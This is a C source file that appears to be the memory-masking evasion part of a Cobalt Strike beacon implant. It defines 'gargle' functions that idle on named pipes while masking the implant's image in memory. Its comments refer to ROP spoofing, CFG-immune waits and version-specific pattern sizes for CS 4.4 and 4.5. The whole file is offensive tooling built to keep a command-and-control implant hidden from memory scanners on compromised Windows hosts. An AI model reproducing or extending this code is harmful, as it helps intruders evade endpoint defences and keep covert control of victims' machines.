/* gargle! */
#include <WinSock2.h>
#include <windows.h>
#include <intrin.h>
#include "beacon.h"
#include "gargleint.h"
#include "sleepmask_gen3.h"

#define GARGLE_ACTION_PIPE_WAIT   0
#define GARGLE_ACTION_PIPE_PEEK   1

typedef struct {
	int    action;
	HANDLE pipe;
	BOOL (__stdcall *ConnectNamedPipe)(HANDLE, LPOVERLAPPED);
	DWORD(__stdcall *GetLastError)(void);
	BOOL(__stdcall *PeekNamedPipe)(HANDLE, LPVOID, DWORD, LPDWORD, LPDWORD, LPDWORD);
	void(__stdcall *Sleep)(DWORD);
} GARGLE_PIPE_ARGS;

typedef void(*GARGLEF)(GARGLEP * parms, GARGLE_PIPE_ARGS * args);

/* this is the stub function we copy over */
/* For CS 4.4 the pattern size is 268 */
/* For CS 4.5 the pattern size is 768 */
static void _gargle_it(GARGLEP * parms, GARGLE_PIPE_ARGS * args) {
	GARGLE_TRAMPOLINE_STUB()
}

static void setup_trampoline2() {
	gargle_trampoline(setup_trampoline2, _gargle_it);
}

void GargleBlockPipe(HANDLE pipe) {
	/* Phase 2 wait-window: idle-wait for pipe data masked, in gen3 sleep
	 * slices (each slice = full mask + ROP spoof when the engine serves
	 * it). The peek itself is a microsecond syscall between windows.
	 * Guard semantics unchanged: threaded parents and nook==0 profiles
	 * keep the plain (unmasked) behavior - masking under a live sibling
	 * thread would corrupt its view of the image. */
	if (setting_int(SETTING_GARGLE_NOOK) != 0 && threadcount == 0) {
		DWORD avail = 0;
		while (PeekNamedPipe(pipe, NULL, 0, NULL, &avail, NULL) && avail == 0)
			if (!gen3_sleep(700))
				Sleep(700);
	}
}

BOOL GarglePipeWait(HANDLE pipe) {
	/* Phase 2 wait-window: serve the server-side connection wait inside a
	 * masked gen3 window (no timers -> CFG-immune, indefinite by
	 * construction). FALSE falls back to the plan-B ConnectNamedPipe
	 * loop exactly like the long-proven nook == 0 behavior. */
	if (setting_int(SETTING_GARGLE_NOOK) == 0 || threadcount > 0)
		return FALSE;
	return gen3_wait_pipe(pipe);
}